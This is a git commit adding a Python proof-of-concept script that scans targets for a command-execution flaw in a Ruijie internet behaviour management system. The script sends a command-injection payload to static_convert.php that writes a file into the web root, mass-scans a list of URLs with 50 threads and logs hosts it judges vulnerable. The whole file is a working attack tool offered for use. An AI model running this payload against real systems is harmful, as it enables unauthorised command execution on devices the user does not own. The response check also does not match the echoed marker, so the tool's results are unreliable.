f13a7506f57c49cda731576293fa44362fd403fc
cx3301433 <168405637+cx3301433@users.noreply.github.com>
2024-07-01 20:09:30 +0800

    Add files via upload

---
+++ 锐捷上网行为管理系统 static_convert 命令执行漏洞/ruijie.py
@@ -0,0 +1,75 @@
+# 锐捷上网行为管理系统 static_convert 命令执行漏洞
+import argparse,sys,requests
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+import time
+
+#定义横幅
+
+
+def banner():
+    banner = """
+██████╗ ██╗   ██╗██╗     ██╗██╗███████╗
+██╔══██╗██║   ██║██║     ██║██║██╔════╝
+██████╔╝██║   ██║██║     ██║██║█████╗  
+██╔══██╗██║   ██║██║██   ██║██║██╔══╝  
+██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗
+╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝                                                                                       
+"""
+    print(banner)
+
+
+#定义主函数
+def main():
+    #调用横幅
+    banner()
+    #argparse模块处理命令行参数
+    parser = argparse.ArgumentParser(description="锐捷上网行为管理系统 static_convert 命令执行漏洞")
+    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
+    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
+    args = parser.parse_args()
+    #如果用户输入url而不是file时：
+    if args.url and not args.file:
+        poc(args.url)
+        # if poc(args.url):
+        #     exp(args.url)
+    #如果用户输入file而不是url时：
+    elif args.file and not args.url:
+        url_list=[]
+        with open(args.file,mode='r',encoding='utf-8') as fr:
+            for i in fr.readlines():
+                url_list.append(i.strip().replace('\n',''))
+                # print(url_list)    
+                #设置多线程 
+        mp = Pool(50)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    #如果用户输入的既不是url也不是file时：
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+             
+#定义poc
+def poc(target):
+    payload = "/view/IPV6/naborTable/static_convert.php?blocks[0]=||echo%20'HelloWorldTest1'>/var/www/html/tmptest%0A"
+    url = target+payload
+    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36", "Connection": "keep-alive"}
+    #请求网页
+    # 上传后的url：/tmptest
+    try:
+        re = requests.get(url=url,headers=headers,verify=False)
+        if re.status_code == 200 and '0ip' in re.text: 
+            print(f'[+++]该{target}存在漏洞')
+            with open('result.txt',mode='a',encoding='utf-8')as ft:
+                ft.write(target+'\n')
+            return True
+        else:
+            print(f'该{target}不存在该漏洞')
+        return False
+    except:
+        print(f'该{target}存在问题，请手动测试')
+        return False
+
+
+if __name__ == '__main__':
+    main()
